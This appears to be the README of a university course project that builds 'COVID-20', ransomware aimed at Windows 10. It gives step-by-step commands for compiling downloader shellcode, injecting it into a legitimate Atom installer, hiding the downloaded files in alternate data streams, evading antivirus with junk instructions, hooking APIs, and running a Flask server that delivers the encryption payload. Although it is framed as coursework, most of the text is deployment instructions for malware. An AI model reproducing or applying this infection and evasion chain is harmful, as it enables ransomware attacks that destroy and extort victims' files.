# COVID-20 Ransomware

COVID-20 is a ransomware that encrypts several types of files in a smart way and asks for a rescue in order to retrieve the encryption key. This ransomware is designed to target Windows users, more precisely Windows 10 users. This project was done during the Malware subject of the UPC Master's Degree in Cybersecurity.

**DISCLAIMER: This project was done for educational purposes. We are not responsible for the use you give it.**

## Infection
For the infection part we decided to use *code resizing* technique. This consits in modifing the size of a section of a *.exe* file in order to add the malicous code

For this, we have the following files, located in */infection* directory:
- PE.cpp
- PE.h
- InfectPE.cpp -> These three first files are a customization made by us of the [InfectPE](https://github.com/secrary/InfectPE) project
- payloadDownloader.cpp -> code that after will become the shellcode that will be injected in a legitimate exe file
- AtomSetupHealthy.exe -> Atom installer without being infected
- AtomSetup.exe -> The Atom installer infected
- ShellcodeCompiler_x64.exe -> C/C++ compiler that not generates 0's in the shellcode. Extracted from [here](https://github.com/NytroRST/ShellcodeCompiler).

### Create shellcode
From C/C++ to assembly.
```sh
> ShellcodeCompiler_x64.exe -r payloadDownloader.cpp -a Asembly_NoJunk.asm -p win_x86
```
You have the assembly code of the `payloadDownloader.cpp` in the */infection* directory.


Assembly to shellcode.
```sh
$ nasm -f win32 Asembly_NoJunk.asm 
$ objcopy -j .text -O binary Asembly_NoJunk.obj binary.bin
$ hexdump -v -e '"\\" 1/1 "x%02x"' binary.bin
```

### Infect a file
Put the shellcode inside the infectPE.cpp (only accepts x86 executables). A posible option of executable file to infect is this [AtomInstaller](https://github.com/atom/atom/releases/download/v1.53.0/AtomSetup.exe)

```sh
> g++ -c PE.cpp -std=c++17
> g++ -c InfectPE.cpp -std=c++17
> g++ -o InfectPE.exe InfectPE.o PE.o
> .\InfectPE.exe .\executable_to_infect.exe .\executable_infected.exe
```
You have a compilation of it in `InfectPE.exe` file that is ready to be used.
### List hidden files
To hide the files downloaded by `downloadPayload.cpp` file, we use a techinque based in adding `:` at the end of the file, followed by an identifier. The only way to list these files, is typing the following command in the terminal, inside the directory that are intended to list:

```sh
> dir /R
```

## Anti anti-virus techniques
In order to avoid being detected by an antivirus or a forensic analyst, we decided to add junk instructions to the assembly code generated during the infection part. The `Asembly_Junked.asm` file has the assembly code with all the junk instructions that we added. You can find this file in */anti-techinques* directory.

## Obfuscation
For the obfuscation part, the following files are necessary, which can be found in */Obfuscation* directory:

- ManualMappingTutorial.exe
- APIHooking.dll

You can find the source code of both files in */InjectDLL* and */APIHooking.dll* respectively. To compile it, import both directories as a ***Visual Studio*** project.

## Encryption
In */encryption* directory you will find the following files:

- payload.py -> payload's source code
- payload.exe -> payload's executable
- /test -> directory to test the payload. It contains *.jpg* and *.exe* files 

If you want to modify the `payload.py` and generate a new executable, you can do it with the next command:

```sh
$ pyinstaller payload.py --onefile --console
```
## Malserver
Our Malserver has the following dependences:
- Flask

```sh
$ pip3 install Flask
```

To execute the server:

```sh
$ sudo python3 server.py
```

A part from that, you also need to have the following files in the same directory as the `server.py` file are:

- payload.exe
- ManualMappingTutorial.exe
- APIHooking.dll

`server.py` file is located in */server* directory.

## Old versions
Instructions about how to use the preliminar versions that the project had at any moment during the development. You can find the codes in */old* directory

```sh
> g++ -c processCreator.cpp
> g++ -o procesCreator.exe processCreator.o
> .\processCreator.exe executable_to_execute.exe

> g++ -c shellcodeExecuter.cpp
> g++ -o shellcodeExecuter.exe shellcodeExecuter.o
> .\shellcodeExecuter.exe
```

## Creators
- Cankut Askan
- Albert Azemar
- Ismael Douha
- Marti Fernandez
